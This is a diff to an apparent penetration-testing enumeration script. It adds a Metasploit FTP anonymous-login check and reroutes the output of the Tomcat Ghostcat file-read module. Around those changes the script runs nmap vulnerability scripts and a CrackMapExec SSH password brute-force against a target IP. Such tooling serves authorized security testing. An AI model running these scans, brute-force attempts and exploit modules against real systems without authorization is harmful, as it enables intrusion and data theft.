@@ -71,6 +71,8 @@ echo -e $RED_LINE
   echo -e "${GREEN}+-----------------------------------+${RESET}"
   
 nmap --script "ftp-anon,ftp-vuln*,ftp-*" -p 21 "$IP" -oN $results_dir/ftp
+msfconsole -q -x "use auxiliary/scanner/ftp/anonymous ; spool $results_dir/ftp_msf; set rhosts $IP; set password anonymous; run ;spool off ; exit"
+
 nmap --script ssh-* -p 22 "$IP" | tee $results_dir/ssh_results
 cme ssh "$IP" -u 'users.txt' -p 'password.txt' 2>&1  | tee -a $results_dir/ssh_results
 nmap -n --script "*telnet* and safe" -p 23 "$IP"  -oN $results_dir/telenet
@@ -178,7 +180,7 @@ echo -e $RED_LINE
   echo -e "${GREEN}+-----------------------------------+${RESET}"
   
 nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 $IP | tee tee $results_dir/apache_ajp_results
-msfconsole -q -x "use auxiliary/admin/http/tomcat_ghostcat; spool $results_dir/apache_ajp_results; set rhosts $IP; run ;spool off ; exit"
+msfconsole -q -x "use auxiliary/admin/http/tomcat_ghostcat; spool $results_dir/apache_ajp_msf; set rhosts $IP; run ;spool off ; exit"
 
 
 echo -e $RED_LINE
